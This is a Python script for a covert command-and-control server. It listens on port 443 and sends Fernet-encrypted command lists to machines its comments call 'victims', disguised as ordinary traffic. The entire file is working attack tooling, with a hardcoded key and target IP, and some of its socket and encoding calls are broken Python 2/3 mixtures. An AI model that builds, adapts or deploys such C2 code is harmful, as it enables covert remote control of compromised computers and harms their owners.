# This is a server side program that sends a list of commands to clients
# A list of commands will be covertly sent to victims within a fake packet
# Witout commands options, it will send a ping to victims specified in hostnames
# With commands option, it will send a list of commands to victims.

# Using scapy to create a packet
from scapy.all import *
load_layer("tls")
import sys
from cryptography.fernet import Fernet

clientkey = "0xaaaa"
fernetkey = "PiffAUwQh2Rt0g4Bo_-yOiKNeHPrub3ljgER0CPqSwQ="
dport = 7777 # write down vicitim's port number
dstip = "192.168.1.152" # write down vicitim's ip address

#read commands file or hostname files and return the list of commands
def read_file(path):
    try:
        with open(path) as file:
            lines = file.read().splitlines()
    except:
        print("Wrong path to file")
        return

    return lines

def encrypt_payload(payload,key):
    encoded_payload = payload.encode()
    f = Fernet(key)
    return f.encrypt(encoded_payload)

def decrypt_payload(payload,key):
    f = Fernet(key)
    return f.decrypt(payload).decode()


if __name__ == "__main__":


    # Argument handling
    argv = sys.argv
    argc = len(argv)
    tracefile = ""

    if argc != 1 and argc != 3:
        print("Usage: python servercnc1.py -c [commands]")
        sys.exit()

    flag = 0                                                                                                                                                                                                        
    commands = ""   #Path to a list of commands to be run on victims                                                                                                    
    count = 0       

    for argct in range(argc-1):                                                                                  
        argcount = argct + 1                                                                                          
        if flag != 1:                                                                                                                                             
            if argv[argcount].lower() == '-c':
                flag = 1
                commands = argv[argcount+1]
        else:
            flag = 0
    commands_list = []
    commands_list = read_file(commands)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.bind(('',443))
    s.listen(5)
    
    while True:
        print("Accepting connections...")
        clientsocket, address = s.accept()
        print("Connection from {0} has been established".format(address))


        received_msg = clientsocket.recv(65535)
        if len(received_msg) != 0:
            msg = decrypt_payload(received_msg,fernetkey)
            if msg[:6] == clientkey:
                if commands_list == []:
                    clientsocket.send("0xaaaa")
                    received_pkt = clientsocket.recv(65535)
                    pkt = received_pkt.encode('hex')
                    print("Packet received:{0}".format(pkt[80:]))
                else:
                    payload = clientkey
                    try:
                        commands_iterator = iter(commands_list)
                        flag = False
                        while True:
                            payload = payload + next(commands_iterator) + "\n"
                    except:
                        print("next done")
                        pass
                    x = encrypt_payload(payload,fernetkey)
                    print(x)
                    clientsocket.send(x)